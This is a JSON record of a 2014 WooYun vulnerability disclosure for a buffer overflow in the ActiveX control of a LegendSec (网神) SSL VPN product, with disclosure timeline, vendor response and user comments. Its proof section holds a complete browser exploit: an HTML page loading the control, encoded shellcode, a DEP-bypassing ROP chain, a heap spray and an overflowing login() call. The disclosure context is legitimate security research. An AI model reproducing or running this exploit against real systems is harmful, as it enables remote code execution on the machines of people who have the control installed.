{"id": 1768, "wybug_id": "wooyun-2014-062773", "wybug_title": "网神某产品activex 控件远程代码执行漏洞", "wybug_corp": "网神信息技术（北京）股份有限公司", "wybug_author": "想要减肥的胖纸", "wybug_date": "2014-05-29 16:57", "wybug_open_date": "2014-08-27 16:58", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程代码执行", "浏览器插件漏洞", "漏洞"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-06：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-27：\t细节向公众公开  简要描述： 攒钱买垃圾桶 详细说明：  网神vpn控件 用的应该很多。\n名称:         IeAx Class发行者:        网神信息技术（北京）股份有限公司类型:         ActiveX 控件版本:         0.0.1.12文件日期:       上次访问日期:     2014年5月29日，16:46类 ID:       {100C2765-1362-4CCF-AB02-56D916BB8732}使用计数:       59阻止次数:       3文件:         gwieplugin_1c102f225d.dll文件夹:        C:\\Program Files\\Gateway\\SSLVPN\n\n\n\n<html><object classid='clsid:100C2765-1362-4CCF-AB02-56D916BB8732' id='target' ></object><script >junk1 = \"\";while(junk1.length < 5252) junk1+=\"A\";target.login(junk1,1,\"defaultv\",\"defaultv\",\"defaultv\");</script></html>\n   漏洞证明：  \n<html><head>    <title>legendsec sslvpn activex exploit bypass dep on xpsp3 ie8</title></head><body><!--    EIP contains normal pattern : 0x41346941 (offset 252)    ESP (0x016acb30) points at offset 256 in normal pattern (length 2744)    EBP contains normal pattern : 0x33694132 (offset 248)    ESI (0x016ad090) points at offset 1632 in normal pattern (length 1368)-->    <object classid=\"clsid:100C2765-1362-4CCF-AB02-56D916BB8732\" id='poc'></object>    <script>\t\t// [ Shellcode ]\t\tvar shellcode = unescape('%ue8fc%u0089%u0000%u8960%u31e5%u64d2%u528b%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%uc031%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf0e2%u5752%u528b%u8b10%u3c42%ud001%u408b%u8578%u74c0%u014a%u50d0%u488b%u8b18%u2058%ud301%u3ce3%u8b49%u8b34%ud601%uff31%uc031%uc1ac%u0dcf%uc701%ue038%uf475%u7d03%u3bf8%u247d%ue275%u8b58%u2458%ud301%u8b66%u4b0c%u588b%u011c%u8bd3%u8b04%ud001%u4489%u2424%u5b5b%u5961%u515a%ue0ff%u5f58%u8b5a%ueb12%u5d86%u016a%u858d%u00b9%u0000%u6850%u8b31%u876f%ud5ff%uf0bb%ua2b5%u6856%u95a6%u9dbd%ud5ff%u063c%u0a7c%ufb80%u75e0%ubb05%u1347%u6f72%u006a%uff53%u63d5%u6c61%u0063');\t\tvar rop_chain = \"\\ube4b\\u77be\" + // 0x77bebe4b : ,# POP EBP # RETN [msvcrt.dll]                        \"\\ube4b\\u77be\" + // 0x77bebe4b : ,# skip 4 bytes [msvcrt.dll]                        \"\\u6e9d\\u77c1\" + // 0x77c16e9d : ,# POP EBX # RETN [msvcrt.dll]                        \"\\uE000\\u0000\" + // 0x0000E000 : ,# 0x0000E000-> ebx [dwSize]                        \"\\ucdec\\u77c1\" + // 0x77c1cdec : ,# POP EDX # RETN [msvcrt.dll]                        \"\\u0040\\u0000\" + // 0x00000040 : ,# 0x00000040-> edx                        \"\\u79da\\u77bf\" + // 0x77bf79da : ,# POP ECX # RETN [msvcrt.dll]                        \"\\uf67e\\u77c2\" + // 0x77c2f67e : ,# &Writable location [msvcrt.dll]                        \"\\uaf6b\\u77c0\" + // 0x77c0af6b : ,# POP EDI # RETN [msvcrt.dll]                        \"\\u9f92\\u77c0\" + // 0x77c09f92 : ,# RETN (ROP NOP) [msvcrt.dll]                        \"\\u6f5a\\u77c1\" + // 0x77c16f5a : ,# POP ESI # RETN [msvcrt.dll]                        \"\\uaacc\\u77bf\" + // 0x77bfaacc : ,# JMP [EAX] [msvcrt.dll]                        \"\\u289b\\u77c2\" + // 0x77c2289b : ,# POP EAX # RETN [msvcrt.dll]                        \"\\u1131\\u77be\" + // 0x77BE1131 : ,# ptr to &VirtualProtect() [IAT msvcrt.dll] 0x20-0xEF=0x31                        \"\\u67f0\\u77c2\" + // 0x77c267f0 : ,# PUSHAD # ADD AL,0EF # RETN [msvcrt.dll]                        \"\\u1025\\u77c2\";  // 0x77c21025 : ,# ptr to 'push esp #  ret ' [msvcrt.dll]\t\t// [ fill the heap with 0x0c0c0c0c ] About 0x2000 Bytes\t\tvar fill = \"\\u0c0c\\u0c0c\";\t\twhile (fill.length < 0x1000){\t\t\tfill += fill;\t\t}\t\t// [ padding offset ]\t\tpadding = fill.substring(0, 0x5F6);\t\t// [ fill each chunk with 0x1000 bytes ]\t\tevilcode = padding + rop_chain + shellcode + fill.substring(0, 0x800 - padding.length - rop_chain.length - shellcode.length);\t\t// [ repeat the block to 512KB ]\t\twhile (evilcode.length < 0x40000){\t\t\tevilcode += evilcode;\t\t}\t\t// [ substring(2, 0x40000 - 0x21) - XP SP3 + IE8 ]\t\tvar block = evilcode.substring(2, 0x40000 - 0x21);\t\t// [ Allocate 200 MB ]\t\tvar slide = new Array();\t\tfor (var i = 0; i < 800; i++){\t\t\tslide[i] = block.substring(0, block.length);\t\t}var junk = ''; while(junk.length<252) junk += 'A';var junk2 = ''; while(junk2.length<3000) junk2 += 'B';eip = \"\\x0c\\x0c\\x0c\\x0c\";popeax = \"\\x28\\x7b\\x71\\x7d\";// 0x7d717b28  {PAGE_EXECUTE_READ} [SHELL32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v6.00.2900.6242 (C:\\WINDOWS\\system32\\SHELL32.dll)xchg = \"\\x0d\\x64\\x60\\x3d\"; //0x3d60640d : '\\x94\\xc3' | ascii {PAGE_EXECUTE_READ} [mshtml.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v8.00.6001.23588 (C:\\WINDOWS\\system32\\mshtml.dll)str = \"\\x0c\\x0c\\x0c\\x0c\"; payload = junk + popeax + str +xchg + junk2;poc.login(payload,1,\"defaultv\",\"defaultv\",\"defaultv\");    </script></body></html>\n\n\n   修复方案：     版权声明：转载请注明来源 想要减肥的胖纸@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2014-06-03 11:11 厂商回复： CNVD确认所述情况，与29日提交给CNCERT的其他两个漏洞一并通报给网神公司处置（此前已经建立与其的联系处置渠道）。WOOYUN此类漏洞相对较少，rnak 18 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-05-29 17:38 |    \t\tMeirLin \t\t\t( 实习白帽子  |\t\t\t        Rank:96 漏洞数:30        | 号借人)\t\t \n  攒钱买垃圾桶，垃圾桶里放钱    \n     2014-05-29 17:40 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @想要减肥的胖纸 internet域能加载么？    \n     2014-05-29 18:07 |    \t\t想要减肥的胖纸 \t\t\t( 普通白帽子  |\t\t\t        Rank:250 漏洞数:42        )\t\t \n  @疯狗  测试了下 不能直接加载    \n     2014-05-29 18:18 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @想要减肥的胖纸 嗯 直觉告诉我不能加载 大部分activeX都只提供本地调用的    \n     2014-05-29 23:33 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  V5    \n     2014-05-29 23:55 |    \t\t雏鹰 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 关注互联网的那些事、关注web安全、关注安...)\t\t \n  怎么发现的。    \n     2014-06-23 12:24 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  给力啊啊    \n     2014-08-27 21:50 |    \t\t孤零落叶寒 \t\t\t( 普通白帽子  |\t\t\t        Rank:162 漏洞数:26        | 今天的跌倒是是为了明天更好的站着)\t\t \n  Rank    rnak    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}